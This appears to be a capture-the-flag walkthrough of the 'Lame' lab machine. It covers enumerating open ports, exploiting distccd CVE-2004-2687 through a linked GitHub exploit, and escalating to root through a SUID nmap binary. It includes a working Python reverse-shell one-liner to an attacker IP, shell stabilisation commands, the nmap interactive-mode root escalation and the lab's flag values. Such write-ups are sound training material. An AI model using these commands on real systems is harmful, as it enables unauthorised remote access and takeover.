# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22   | SSH     |
| 139  | SMB     |
| 445  | SMB     |
| 3632 | distccd |



# RECONNAISSANCE
---

FTP anonymous login is enabled, let's check it out:


![Pasted image 20250402152900.png](../../IMAGES/Pasted%20image%2020250402152900.png)

Nothing in here, `smb` anonymous login is not enabled unfortunately, let's keep on going, if we remember the scan, we got the following on port `3632`:

```
PORT     STATE SERVICE VERSION
3632/tcp open  distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
```

We got something called `distccd`, `distcc`Â is a tool designed to distribute compilation of C/C++/Objective-C code across multiple machines on a network. It speeds up large builds by parallelizing the workload.

Since we got `distccd v1`, we can search for an exploit regarding that version:

![Pasted image 20250402153430.png](../../IMAGES/Pasted%20image%2020250402153430.png)




# EXPLOITATION
---


This is a pretty old CVE, we are facing `CVE-2004-2687`, we can search for an exploit in GitHub:

![Pasted image 20250402153623.png](../../IMAGES/Pasted%20image%2020250402153623.png)

Link: https://github.com/angelpimentell/distcc_cve_2004-2687_exploit


If we use the exploit, we can see this:

![Pasted image 20250402153655.png](../../IMAGES/Pasted%20image%2020250402153655.png)


We can get ourselves an interactive shell: 

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.239",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

If we check up our listener:

![Pasted image 20250402154059.png](../../IMAGES/Pasted%20image%2020250402154059.png)

Let's proceed with privesc.



# PRIVILEGE ESCALATION
---


First step is to stabilize our shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

We can read `user.txt` now:

```
daemon@lame:/$ cat /home/makis/user.txt
6c8d8478b697ee1e975fb840878c905a
```

Let's use linpeas for a way to get into root:

![Pasted image 20250402154841.png](../../IMAGES/Pasted%20image%2020250402154841.png)

We got `nmap` binary set with a `4000 SUID`, let's check `gtfobins`:

![Pasted image 20250402155155.png](../../IMAGES/Pasted%20image%2020250402155155.png)

So, we need to do the following in order to get root:

```
/usr/bin/nmap --interactive
!sh
```

![Pasted image 20250402155218.png](../../IMAGES/Pasted%20image%2020250402155218.png)

We can finally read `root.txt`:

```
sh-3.2# cat /root/root.txt
259db45cfc8e1723f21fb0387f48ff5f
```


![Pasted image 20250402155300.png](../../IMAGES/Pasted%20image%2020250402155300.png)


